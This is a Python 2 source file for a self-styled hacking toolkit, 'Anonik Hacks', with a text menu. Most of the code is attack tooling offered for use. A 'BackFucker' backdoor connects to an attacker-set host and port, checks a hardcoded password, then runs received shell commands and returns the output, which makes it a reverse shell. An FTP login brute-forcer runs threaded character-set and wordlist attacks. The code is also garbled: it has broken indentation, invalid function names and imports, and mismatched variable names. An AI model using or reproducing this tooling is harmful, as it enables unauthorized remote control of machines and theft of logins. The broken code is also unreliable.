#!/usr/bin/python

import subprocess
import socket
import pyfiglet
import argparse
import sys
import threading
import time

from datetime import datetime
from itertools import chain, products
from ftplib import FTP

menuChoice = ""
bbChoice = ""





#Menu List

def menuList():
	print "[1] Backdoor & Bruteforce \n"

	print "[2] Utility & Tools \n "

	print "[3] Web Exploit \n"

	print "[4] Credits ... \n"



def bb():

	def Backfucker():

		host = "" #Attack computer ip *Set this with the source code
port = "" #Port Attack
passwd = "s3cr3t" #Password

#Checking Password - 
def DisplayStart():
	ascii_banner = pyfiglet.figlet_format("BackFucker")
	print(ascii_banner)                                                                                      
print DisplayStart()
host = raw_input("Enter your Host-IP: ")
print ""
port = raw_input("Enter your Port: ")
def Login():
	global s
	s.send("Login: ")
	pwd = s.recv(1024)

	if pwd.strip() != passwd:
		Login()
	else:
		s.send("Connected #> ")
		Shell()
#Execute Shell Commands
def Shell():
	while True:
		data = s.recv(1024)

		if data.strip() == ":kill":
			break

		proc =  subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output = proc.stdout.read() + proc.stderr.read()
		s.send(output)
		s.send("#> ")

#Start script
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,int(port)))
Login()

	def FTP Bruteforce():
		print "FTP Bruteforce"

	class glob:
		pwd = False #Used for stopping attack when password found
		chrset = "" #Character set for brute-force
		prefix = "" #prefix string
		postfix ="" #postfix string
		lenght = 8 #Default lenght of password
		minlenght = 5 #default min lenght of password
		thrds = 10 # Default num of threads
		verb = False #Default value for verbose output
		pause = 0.01 #Default throttle time 1 = one second
		cnt = 0 #Counting numer of attempts

	#Iterable Method for brute-forcing a character set and lenght
	def bruteforce(charset,maxlenght,minlenght):
		return (''.join(candidate)
			for candidate in chain.from_iterable(product(charset, repeat = i)
				for i in range(minlenght,maxlenght + 1)))
	#Method for making ftp connections
	def crack(host,user,pwd):
		try:
			if glob.verb: #Check for verbose output
				print "[" + str(glob.cnt) + "] Trying: " + pwd.strip()
			ftp = FTP(host) #Create FTP Object
			if ftp.login (user,psw): #check if true
				print "\n Password for " +user +": " + pwd.strip()
				print "==========================================="
				glop.pwd = True #Set global value
				print ftp.dir() #Display contents of root FTP
				ftp.quit() #Disconnect from FTP
		except Exception as err:
			pass #ignore errors

	#Method wait for threads to complete
	def wait(threads):
		for thread in threads: thread.join()

	#Method for staging attack
	def main(args):
		try:
			start = datetime.now() #TIme Attack started
			print "\n Attacking FPT user [" + args.username + "] at [" + args.host +"]"
			print "====================================================="
			thrdCnt = 0;threads = [] #Local variables
			#Set global variables
			if args.pause:glob.pause = float(args.pause)
			if args.verbose:glob.verb = True
			if args.threads:glob.thrds = int(args.threads)
			if args.lenght:glob.lenght = int(args.lenght)
			if args.minlenght:glob.minlenght = int(args.minlenght)
			if args.charset:glob.chrset = args.charset
			if args.prefix:glob.prefix = args.prefix
			if args.postfix:glob.postfix = args.postfix
			if args.charset == None:
				#Create charset from printable ascii range
				for char in range(37,127):glob.charset += chr(char)
			#Brute force attack
			if args.worlist == None:
				for pwd in bruteforce(glob.chrset, int(glob.lenght),int(glob.minlenght)): #Launch Bruteforce
					if glob.pwd: break #if password found
					if thrdCnt != args.threads: #Create threads until args.theads
						if args.prefix:
							pwd = str(args.prefix) + pwd
						if args.postfix:
							pwd += str(args.postfix)
						thread = threading.Thread(target=crack, args=(args.host,args.username,psw,))
						thread.start()
						threads.append(thread)
						thrdCnt += 1;glob.cnt+=1
						time.sleep(glob.pause) #Set pause time
					else: #Wait for theads to complete
						wait(threads)
						thrdCnt = 0
						threads = []
		#Dictionary Attack
		else:
			with open(args.wordlist) as fle: #Open WOrdlist
				for pwd in fle: #loop through passwords
					if glob.pwd: break #Stop if password found
					if thrdCnt != args.threads: #Create theads until args.threads
						threads = threading.Thread(target=crack, args=(args.host,args.username,pwd,))
						thread.start()
						threads.append(thread)
						thrdCnt +=1;glob.cnt+=1
						time.sleep(glob.pause)
					else:
						wait(threads)
						thrdCnt = 0
						threads = []
	



	print "[1] BackFukcer \n "

	print "[2] FTP Bruteforce \n"

	bbChoice = raw_input("Select your tools: \n")
	if bbChoice == 1:
		BackFukcer()
	elif bbChoice == 2:
		fptBrute()
	else:
		print "Nessun comando trovato ritorno alla home . . . \n"
		print startScreen()



def startScreen():
	ascii_banner = pyfiglet.figlet_format("Anonik Hacks")
	print(ascii_banner)

	print "- - - By Anonik V.1.0.0 - - - \n \n"

	print menuList()

	menuChoice = raw_input("Choice your Selection:  \n")

	if menuChoice == str(1):
		print bb()


	#elif menuChoice == 2:
		#print Utility()

	#elif menuChoice == 3:
		#print webExploit()

	elif menuChoice == 4:
		print creditsMenu()

	else:
		print "Ciao"


print startScreen()


#def Utility():
#def webExploit():
#def creditsMenu():





